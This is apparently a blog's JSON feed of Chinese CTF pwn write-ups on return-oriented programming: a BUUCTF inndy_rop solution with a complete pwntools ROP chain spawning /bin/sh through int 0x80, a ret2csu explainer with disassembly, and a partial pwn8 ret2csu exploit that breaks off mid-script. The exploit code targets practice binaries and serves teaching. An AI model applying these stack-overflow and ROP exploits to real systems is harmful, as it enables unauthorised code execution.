{
    "version": "https://jsonfeed.org/version/1",
    "title": "此时相望不相闻，愿逐月华流照君 • All posts by \"rop\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/30/pwn/%E5%88%B7%E9%A2%98/BUUCTF/inndy_rop/",
            "url": "https://vvwwvv.cn/2023/09/30/pwn/%E5%88%B7%E9%A2%98/BUUCTF/inndy_rop/",
            "title": "inndy_rop（rop和系统调用）",
            "date_published": "2023-09-30T07:08:15.000Z",
            "content_html": "<h1 id=\"前置知识\"><a class=\"anchor\" href=\"#前置知识\">#</a> 前置知识</h1>\n<p>静态编译程序特点</p>\n<p>（main 函数里实现非常简单，但是拖入 IDA 后函数窗口里的函数很复杂大概率是静态编译的，因为没有使用系统 libc 所以程序的.text 段会看起来会很复杂）</p>\n<h1 id=\"1查看程序信息\"><a class=\"anchor\" href=\"#1查看程序信息\">#</a> 1. 查看程序信息</h1>\n<p>32 位程序，未开启 pie，开启了 nx</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPq00Gn.png\" alt=\"\" /></p>\n<p>ida 反汇编查看 main 函数，发现有个 <code>overflow函数</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">overflow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>查看 <code>overflow函数</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_BYTE <span class=\"token operator\">*</span><span class=\"token function\">overflow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现有个 gets 函数，可以无限制的写入导致栈溢出</p>\n<h1 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h1>\n<p>有个 gets 函数可以栈溢出，但是没有后门函数，用 ida 发现里面有许许多多乱七八糟的函数，应该是来干扰的，没有调用 write 或者 puts 等函数无法泄露 libc，这种情况下可以尝试系统调用，因为程序本身有很多函数，会调用很多寄存器，这样方便我们构造系统调用的结构</p>\n<p>先查看是否有 <code>int 0x80</code>  来调用系统调用</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPq0bZD.png\" alt=\"\" /></p>\n<p>找到了 <code>int 0x80</code> ，那我们就可以在找其他相应的寄存器来构造 <code>execve(&quot;/bin/sh&quot;,0,0)</code>  系统调用号为 <code>11</code></p>\n<pre><code>32位架构系统调用寄存器顺序为：\n1. eax（存放系统调用号，并不是指int 0x80）\n2. ebx（存放第一个参数，&quot;/bin/sh&quot;）\n3. ecx（存放第二个参数,   0  ）\n4. edx（存放第三个参数,   0   ）\n</code></pre>\n<p>利用方式 1：</p>\n<p>利用 ROPgadget 查找对应地址</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPq0jJA.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqBSQP.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqB9L8.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqBidg.png\" alt=\"\" /></p>\n<p>构造 rop 链的时候只要记得 32 位系统是先函数再参数</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYWNjaGlhdG8uaW5rL3B3bi9jdGYvYnV1Y3RmLyNpbm5keS1yb3A=\">https://macchiato.ink/pwn/ctf/buuctf/#inndy-rop</span></p>\n<p>利用方式 2：</p>\n<p>利用 ROPgadget 来直接生成对应的 <code>ropchain</code></p>\n<p><code>ROPgadget --binary rop --ropchain</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqDu9A.png\" alt=\"\" /></p>\n<p>使用方式：将这段代码复制过去加上对应个数的 padding 即可</p>\n<p><strong>注意</strong> :</p>\n<p>工具生成的代码和我们日常使用的代码格式和风格上都有一定差距，从 struct 包中导入的 pack 函数也会和 pwntools 中的 pack 起冲突，如果一定要使用 struct 的 pack，就在导入 pwntools <code>后</code> 再 <code>导入struct</code> ，这样就可以覆盖掉 pack</p>\n<p><strong>一定要导入库，导入库！！！</strong></p>\n<h1 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> pack</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./rop')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>io<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27363</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806ecda</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080b8016</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0805466b</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806ecda</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea064</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 4</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080b8016</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'//sh'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0805466b</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806ecda</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea068</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080492d3</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor eax, eax ; ret</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0805466b</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080481c9</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop ebx ; ret</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080de769</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop ecx ; ret</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea068</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806ecda</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea068</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 8</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080492d3</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># xor eax, eax ; ret</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0807a66f</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># inc eax ; ret</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806c943</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># int 0x80</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload<span class=\"token operator\">=</span>p</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrQPJ.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn",
                "系统调用",
                "rop"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/%E4%B8%93%E6%A0%8F/ret2csu/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/%E4%B8%93%E6%A0%8F/ret2csu/",
            "title": "64位构造通用ROP，ret2csu",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"ret2csu\"><a class=\"anchor\" href=\"#ret2csu\">#</a> ret2csu</h1>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h2>\n<ul>\n<li>64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候我们很难找到每个寄存器对应的 gadges。这时候，我们可以利用 x64 下的__libc_csu_init 中的 gadgets。</li>\n<li>这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</li>\n</ul>\n<h4 id=\"下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\"><a class=\"anchor\" href=\"#下面借用别人在ida摘出来的__libc_csu_init函数的汇编指令\">#</a> 下面借用别人在 IDA 摘出来的__libc_csu_init 函数的汇编指令</h4>\n<pre><code>.text:00000000004011B0 ; void _libc_csu_init(void)\n.text:00000000004011B0                 public __libc_csu_init\n.text:00000000004011B0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o\n.text:00000000004011B0 ; __unwind &#123;\n.text:00000000004011B0                 push    r15\n.text:00000000004011B2                 mov     r15, rdx\n.text:00000000004011B5                 push    r14\n.text:00000000004011B7                 mov     r14, rsi\n.text:00000000004011BA                 push    r13\n.text:00000000004011BC                 mov     r13d, edi\n.text:00000000004011BF                 push    r12\n.text:00000000004011C1                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004011C8                 push    rbp\n.text:00000000004011C9                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004011D0                 push    rbx\n.text:00000000004011D1                 sub     rbp, r12\n.text:00000000004011D4                 sub     rsp, 8\n.text:00000000004011D8                 call    _init_proc\n.text:00000000004011DD                 sar     rbp, 3\n.text:00000000004011E1                 jz      short loc_4011FE\n.text:00000000004011E3                 xor     ebx, ebx\n.text:00000000004011E5                 nop     dword ptr [rax]\n.text:00000000004011E8\n</code></pre>\n<p>gadgets2:</p>\n<pre><code>.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j\n.text:00000000004011E8                 mov     rdx, r15\n.text:00000000004011EB                 mov     rsi, r14\n.text:00000000004011EE                 mov     edi, r13d\n.text:00000000004011F1                 call    qword ptr [r12+rbx*8]\n.text:00000000004011F5                 add     rbx, 1\n.text:00000000004011F9                 cmp     rbp, rbx\n.text:00000000004011FC                 jnz     short loc_4011E8\n.text:00000000004011FE\n</code></pre>\n<p>gadgets1:</p>\n<pre><code>.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j\n.text:00000000004011FE                 add     rsp, 8\n.text:0000000000401202                 pop     rbx\n.text:0000000000401203                 pop     rbp\n.text:0000000000401204                 pop     r12\n.text:0000000000401206                 pop     r13\n.text:0000000000401208                 pop     r14\n.text:000000000040120A                 pop     r15\n.text:000000000040120C                 retn\n.text:000000000040120C ; &#125; // starts at 4011B0\n.text:000000000040120C __libc_csu_init endp\n</code></pre>\n<p>这里搬运之前在 CSDN 上发的文章（汇编代码执行顺序为先 gadgets2, 然后 gadgets1）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8abb18a591a445808abc86226a99d2c9.png\" alt=\"\" /></p>\n<p>pop 命令 会把栈中的值存入相应的寄存器中，那么我们可以通过往栈中写对应的数据来存入寄存器里</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/8400e847c08a419ba7c04f174dc26712.png\" alt=\"\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cmp</span>     rbx, rbp   //cpm后的不同的调整指令有着不同的作用，这里 jnz 比较结果相同不跳转，不相同就跳转</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>jnz     short loc_400580</pre></td></tr></table></figure><p>最后第二次回到 gadget1 时，此时已经给寄存器赋值完毕只需要回到 ret，此处填充 56 个 padding 字符是因为在地址 0x4011FE 处有   <code>add rsp , 8 </code>  这会把 rsp 栈提高 8，所以要填充 8 个字符来站这个位置，后面的  <code>pop rbx ~ pop r15</code>  共有 6 个寄存器，pop 了 6 次，所以总共是 （6+1）*8=56，所以填充 56 个字符即可到 ret 来控制程序执行</p>\n<p>例题:<a href=\"https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/\" title=\"ret2csu\">https://vvwwvv.cn/2023/05/04/pwn/ 刷题 / 看雪社区 / 看雪社区 pwn8 (64 位构造通用 ROP,ret2csu)/</a></p>\n",
            "tags": [
                "pwn",
                "ret2csu"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BA/%E7%9C%8B%E9%9B%AA%E7%A4%BE%E5%8C%BApwn8(64%E4%BD%8D%E6%9E%84%E9%80%A0%E9%80%9A%E7%94%A8ROP,ret2csu)/",
            "title": "看雪社区pwn8（64位构造通用ROP，ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h3 id=\"查看程序\"><a class=\"anchor\" href=\"#查看程序\">#</a> 查看程序</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/1ed670b5ceeb462994b707ec5fcfcfef.png\" alt=\"\" /></p>\n<h3 id=\"64位程序开启了nx\"><a class=\"anchor\" href=\"#64位程序开启了nx\">#</a> 64 位程序，开启了 NX</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/9c917aba36be440a838d8ac8b70a0c2d.png\" alt=\"\" /></p>\n<p>有溢出漏洞， <strong>变量为 char 型变量</strong></p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/72ef02703ac246488cecade776d65acd.png\" alt=\"\" /></p>\n<p>没有后门函数， 那就 &lt;font color=red&gt; 去 libc 中找 execve 地址执行 &lt;/font&gt;</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/d4fe1b33d8224911a9d218d861317b60.png\" alt=\"\" /></p>\n<p>偏移量为 136</p>\n<pre><code>write：write(1，输出地址，输出字节数)      \n             write(1,write_got,8)                \nread：read(0,写入地址，写入字节数)\n             read(0,bss_base,16)\n</code></pre>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>write<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>read<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bss_base<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>csu1<span class=\"token operator\">=</span><span class=\"token number\">0x000400606</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>csu2<span class=\"token operator\">=</span><span class=\"token number\">0x0004005F0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">,</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">136</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#加 8 个 a 是因为 csu1 里先执行 add rsp，8   ，意味着将栈变长了八字节，要填充才能到后面</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td 